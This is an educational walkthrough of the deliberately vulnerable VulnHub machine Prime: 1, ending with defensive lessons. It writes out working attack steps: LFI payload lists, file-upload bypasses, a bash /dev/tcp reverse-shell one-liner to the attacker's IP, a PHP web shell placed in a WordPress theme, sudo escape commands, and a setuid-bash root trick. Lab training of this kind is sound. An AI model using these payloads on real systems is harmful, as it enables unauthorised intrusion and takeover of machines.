# Prime: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Prime: 1 |
| **Difficulty** | Easy / Intermediate (OSCP-style, long enumeration chain) |
| **Author** | Suraj Pandey |
| **Released** | 1 September 2019 |
| **VulnHub Entry** | <https://vulnhub.com/entry/prime-1,358/> |
| **Download** | <https://vulnhub.com/entry/prime-1,358/#download> |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux — Ubuntu 16.04 (kernel `4.10.0-28-generic`) |

> **Note:** Ports, banners and exact file contents can differ slightly between
> the VMware and VirtualBox builds of this box ("varies by build"). The attack
> *chain* below is stable; small details (a service banner, the hidden port)
> may move around. When in doubt, re-run the enumeration commands yourself.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target host on an isolated lab network (ARP scan + Nmap).
- How to enumerate the *content* of a web server (not just its ports) with a directory brute-forcer.
- What a **hidden parameter** is, and how fuzzing a likely parameter name reveals a **Local File Inclusion (LFI)** bug.
- How LFI is chained to **discover users and credentials**, then to a WordPress admin panel.
- How editing a writable WordPress theme file gives a **reverse shell**.
- How to read `sudo` rights, recover a password from a backup file, crack/decode an encrypted blob, and pivot between local users.
- How an insecure **SUID-like root script** that calls a fixed path can be abused to become root.
- (Bonus) How a **kernel exploit** offers a second path to root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running, be able to
import the OVA, and have the target on the **same host-only/NAT** subnet as Kali.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated lab network. The target
> boots with DHCP, so the IP can change every time you import it — always confirm.

First, look at your own network interface. This tells you which subnet to scan.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:ab:cd:ef brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the `inet 192.168.56.10/24` line means *you* are on the
> `192.168.56.0/24` network. The target lives on the **same** network, so it will
> have a `192.168.56.x` address too. (`/24` = the first three numbers are shared.)

Now sweep the network for live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:ab:cd:ef, IPv4: 192.168.56.10
Starting arp-scan 1.10.0 with 256 hosts
192.168.56.10    08:00:27:ab:cd:ef   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:12:34:56   PCS Systemtechnik GmbH
```

> **Why it works:** `arp-scan` sends ARP requests to every address on the subnet
> and lists the ones that answer. ARP is fast and can't be hidden by a host
> firewall the way a TCP port can. The MAC starting `08:00:27` is the
> VirtualBox card of our VM.

**Target IP:** `192.168.56.101`

![Finding the target with arp-scan](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

```bash
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Prime
MAC Address: 08:00:27:12:34:56 (Oracle VirtualBox virtual NIC)
```

> **How to read it:**
> - `-p-` scans **all** 65,535 TCP ports (not just the well-known ones).
> - `-sV` guesses the service **and version** behind each port.
> - `-sC` runs Nmap's safe default scripts (grabs banners, titles, etc.).
> - **Two attack surfaces:** SSH on 22, a web server on 80. Web servers almost
>   always hide content, so port 80 is where we start.

![Nmap service scan output](images/02-nmap.png)

### 2.2 Web content discovery

A directory brute-forcer tries common file/directory names against the site.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 40
```

```text
/index.php            (Status: 200)
/image.php            (Status: 200)
/dev                  (Status: 301)
/secret.txt           (Status: 200)
/wordpress            (Status: 301)
/server-status        (Status: 403)
```

> **Why it works:** `gobuster` sends an HTTP request for every word in the
> wordlist (`-x php,txt` also tries `name.php` and `name.txt`). A `200` means
> "exists", `301` means "it's a folder", `403` means "exists but forbidden".

Browse `secret.txt` — it is a **hint**, and hints are the whole point of this box.

```bash
curl http://192.168.56.101/secret.txt
```

```text
Looks like you have scanned the directories very well.
There is a hidden parameter in image.php, find it.
Parameter is a word and it is related to the image.php
...
Also look for location.txt  (a hint about searching files)
```

> **Why it matters:** the challenge tells us `image.php` takes a **hidden
> parameter**. Kioptrix/Prime-style boxes like to hide parameters so you must
> *fuzz* for them. We now know: fuzz `image.php`, and be on the lookout for a
> `location.txt`.

![Web enumeration — secret.txt hint](images/03-enum.png)

### 2.3 Fuzzing for the hidden parameter

We know the parameter is "related to image.php". On this box it is
`secrettier360`. When you don't know the name, use `ffuf` with a parameter
wordlist and watch for a different response size.


> ### 📖 Concept — What is Local File Inclusion?
>
> **LFI** happens when a script passes a user-controlled path to `include()`,
> `require()` or a file-read function without validating it:
>
> ```php
> <?php include($_GET['page']); ?>     // you control a filesystem path
> ```
>
> Now you can read anything the web-server user can read:
>
> ```text
> ?page=/etc/passwd
> ?page=../../../../etc/passwd
> ?page=/var/log/apache2/access.log        # log poisoning
> ?page=/proc/self/environ
> ?page=/var/lib/php/sessions/sess_<your PHPSESSID>
> ```
>
> **The wrapper to memorise is `php://filter`** — it returns the file **base64-encoded
> instead of executing it**, so you can read PHP *source*:
>
> ```text
> ?page=php://filter/convert.base64-encode/resource=index.php
> ```
>
> That is how you recover `wp-config.php`, `configuration.php`, `.env` and
> `config/database.php` — i.e. the database credentials.
>
> **LFI alone only reads.** To get code execution you must make the target *write* a
> file you control somewhere predictable, then include it. The usual primitives: an
> **NFS export**, session files, **log poisoning** (inject PHP through a crafted
> `User-Agent`, then include the access log), or `/proc/self/environ`.
>
> **RFI** (`?page=http://attacker/shell.txt`) is the remote version and requires
> `allow_url_include=1` in `php.ini` — off by default since PHP 5.2. When it fails the
> error usually says `http:// wrapper is disabled`, which tells you to switch to LFI
> plus a local write.
>
> **Deep dive:** [CONCEPTS §13.2 — LFI](../../docs/CONCEPTS.md#132-local-file-inclusion-lfi) ·
> [§13.3 — RFI](../../docs/CONCEPTS.md#133-remote-file-inclusion-rfi)

```bash
ffuf -u "http://192.168.56.101/image.php?FUZZ=/etc/passwd" \
     -w /usr/share/wordlists/LFI/file_inclusion_linux.txt \
     -fs 13
```

```text
secrettier360           [Status: 200, Size: 2616, Words: 48, Lines: 50]
```

> **Why it works:** `FUZZ` is replaced with each word in the list. Most guesses
> return a tiny 13-byte "no file" message (`-fs 13` filters those out). The
> guess that returns `/etc/passwd`-sized output is our winner: `secrettier360`.

---

## 3. Foothold

### 3.1 Confirming and using the LFI

```bash
curl "http://192.168.56.101/image.php?secrettier360=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
saket:x:1001:1001:find password.txt file in my directory:/home/saket:/bin/bash
```

> **Why it works:** the PHP behind `image.php` does something like
> `include($_GET['secrettier360']);` **without validating the value**. Instead of
> including an image, we make it include a system file. This is a **Local File
> Inclusion (LFI)** vulnerability. Best of all, the GECOS comment field of the
> `saket` account literally tells us where to look next.

Read the file the comment pointed us to.

```bash
curl "http://192.168.56.101/image.php?secrettier360=/home/saket/password.txt"
```

```text
(contents of /home/saket/password.txt -- a plaintext password)
```

We now have a password. It does **not** work for SSH, but the writeups show it
**does** work against the WordPress install for the user `victor`.

### 3.2 Enumerate WordPress users


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u --disable-tls-checks
```

```text
[+] URL: http://192.168.56.101/wordpress/
[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18)
[+] Enumerating Users ...
[i] User(s) Identified:
[+] victor
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress exposes author usernames through URLs like
> `/?author=1`. `wpscan -e u` walks the author IDs and leaks `victor`. (You can
> also just browse `http://192.168.56.101/wordpress/?author=1` and follow the
> redirect.)

### 3.3 WordPress admin → theme editor → reverse shell

Log in at `http://192.168.56.101/wordpress/wp-login.php` as `victor` with the
password from `password.txt`.

Once inside, go to **Appearance → Theme Editor**, select the active theme
(`twentynineteen`) and pick a writable template — the writeups use `secret.php`.
Replace its contents with a PHP reverse shell (Kali ships one):


> ### 📖 Concept — File upload: defences and their bypasses
>
> The goal is to get a file **into a directory the web server executes**. Every
> defence has a standard bypass:
>
> | Defence | Bypass |
> | --- | --- |
> | Extension blacklist (`.php` blocked) | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, `.pHp` (case), `.php.jpg`, `.php%00.jpg` (null byte, old PHP) |
> | MIME-type check (`Content-Type: image/jpeg`) | Change the header in Burp — it is **client-controlled and worthless** |
> | `getimagesize()` / magic-byte check | Prepend real image bytes: `cat legit.jpg shell.php > polyglot.php.jpg` |
> | Randomised filename | Reverse-engineer the scheme (e.g. `md5(name.rand())`), or just **read the response** — many apps echo the stored path |
> | Upload outside the docroot | Find the real path from an error message, or use a plugin that serves it |
> | Double extension stripped | `shell.php.png`, where the app removes only the last extension |
>
> **Always verify where the file landed.** If the app does not tell you, infer it from
> the framework's conventions (`/wp-content/uploads/YYYY/MM/`, `/storage/originals/`,
> `images/`) and confirm with a HEAD request before wiring up a reverse shell.
>
> **Deep dive:** [CONCEPTS §13.5 — File upload](../../docs/CONCEPTS.md#135-file-upload)
> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/shell.php
```

Edit `~/shell.php` and set `$ip` to `192.168.56.10` (Kali) and `$port` to `4444`,
then paste the whole file into the theme editor and click **Update File**.

Start a listener on Kali:

```bash
nc -lvnp 4444
```

Trigger the shell by requesting the file:

```bash
curl http://192.168.56.101/wordpress/wp-content/themes/twentynineteen/secret.php
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 48210
Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP ... x86_64 GNU/Linux
www-data@ubuntu:/var/www/html/wordpress$
```

> **Why it works:** an admin-level user can write PHP into theme files, and
> WordPress runs that PHP when the file is requested. The web server executes it
> as its own user, `www-data` — our first shell.

Upgrade to an interactive TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg   and:  export TERM=xterm
```

![Reverse shell as www-data](images/04-foothold.png)
![Interactive shell](images/05-shell.png)

### 3.4 The user flag

```bash
cat /home/saket/user.txt
```

```text
(prime1 user flag)
```

![User flag](images/06-user-flag.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Check sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

> **Why it works:** `www-data` may run `/home/saket/enc` **as root with no
> password**. `enc` is a custom encryption program. If we can feed it valid
> input, it may produce something that helps us become `saket`.

### 4.2 Find the password the program wants

```bash
grep -r "password" /opt 2>/dev/null
cat /opt/backup/server_database/backup_pass
```

```text
your password for backup_database file enc is

"backup_password"

Enjoy!
```

### 4.3 Run `enc` as root and decrypt its output

```bash
sudo /home/saket/enc
```

```text
enter password: backup_password
good
```

The program drops two files, `enc.txt` and `key.txt`:

```bash
cat /home/saket/key.txt
```

```text
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

> **Why it works:** the hint tells us to MD5 the string `ippsec` and use the
> result as the encryption key.

```bash
echo -n ippsec | md5sum
# 366a74cb3c959de17d61db30591c39d1
```

The output `enc.txt` is Base64 of an AES-256-ECB ciphertext. Decrypt it with
`openssl` (the `-a` flag handles the Base64, `-K` supplies the hex key):

```bash
openssl enc -aes-256-ecb -d -a -K 366a74cb3c959de17d61db30591c39d1 \
  -in /home/saket/enc.txt
```

```text
"Dont worry saket one day we will reach to our destination very soon.
 And if you forget your username then use your old password==> tribute_to_ippsec"
```

### 4.4 Become `saket`, then root

```bash
su saket
# password: tribute_to_ippsec
sudo -l
```

```text
User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
```

Run it:

```bash
sudo /home/victor/undefeated_victor
```

```text
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

> **Why it works:** the "binary" is really a **script that runs `/tmp/challenge`
> as root** and never checks who wrote that file. Anyone can create files in
> `/tmp`, so we get to choose what root executes.

Create `/tmp/challenge` so that root makes a setuid copy of bash:

```bash
printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > /tmp/challenge
chmod 4777 /tmp/challenge
sudo /home/victor/undefeated_victor
/tmp/rootbash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### The root flag

```bash
cat /root/root.txt
```

```text
(prime1 root flag)
```

![Privilege escalation to root](images/07-privesc.png)
![Root flag](images/08-root-flag.png)

> **Alternative path (bonus):** the kernel is `4.10.0-28-generic`, vulnerable to
> **CVE-2017-16995** (Exploit-DB **45010**). You can compile it on Kali
> (`gcc 45010.c -m64 -o exploit -D_GNU_SOURCE`), transfer it to the target,
> run it and get a root shell without touching `undefeated_victor`. Kernel
> exploits are noisy and can crash the VM — the intended path is the
> `undefeated_victor` misconfiguration above.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Hidden GET parameter + Local File Inclusion | `image.php?secrettier360=` | Read arbitrary files → leak `/etc/passwd` and a password file |
| 2 | WordPress user enumeration + credential reuse | `/wordpress/` (`victor`) | Authenticated WordPress admin access |
| 3 | PHP execution via writable theme editor | `wp-content/themes/twentynineteen/secret.php` | Remote code execution → `www-data` shell |
| 4 | Password stored in a world-readable backup file | `/opt/backup/server_database/backup_pass` | Unlocks the `enc` decryption tool |
| 5 | Weak reversible-key encryption scheme (MD5 of a known word) | `/home/saket/enc`, `key.txt` | Recover the `saket` plaintext password |
| 6 | Root-run script executes a user-writable path | `sudo /home/victor/undefeated_victor` → `/tmp/challenge` | Trivial root (`cp /bin/bash` + setuid) |
| 7 | Outdated kernel | `4.10.0-28-generic` | Alternative local root via CVE-2017-16995 / EDB 45010 |

## 6. Defensive lessons (blue team)

- **Validate file paths.** Never pass user input straight into `include()`/`fopen()`.
  Use an allow-list of permitted files and reject `..` and absolute paths (LFI fix).
- **Don't leak users.** Disable WordPress author-archives/`?author=` enumeration,
  or at least don't let usernames map 1:1 to OS accounts.
- **Remove the theme/plugin editor in production** (`define('DISALLOW_FILE_EDIT', true);`)
  so a compromised admin cannot drop a web shell. Restrict who can publish.
- **Never store passwords in shared files.** `backup_pass` should be in a
  secrets manager readable only by a service account, not world-readable in `/opt`.
- **Use real, salted, slow password hashing** for stored secrets — not a key
  derived from a public word and a symmetric cipher you can reverse.
- **Never let a privileged script execute a path an unprivileged user can write**
  (`/tmp/challenge`). Use absolute paths, verify ownership, or better: don't shell
  out at all. This is essentially a SUID-style privilege bug.
- **Patch the kernel** and remove unused SUID/root helpers.
- **Detection ideas:** alert on web requests to theme `.php` files from
  unfamiliar IPs, on outbound connections from `www-data`, and on new setuid
  binaries appearing in `/tmp` (`auditd` watch on `/tmp`).

---

## 7. References

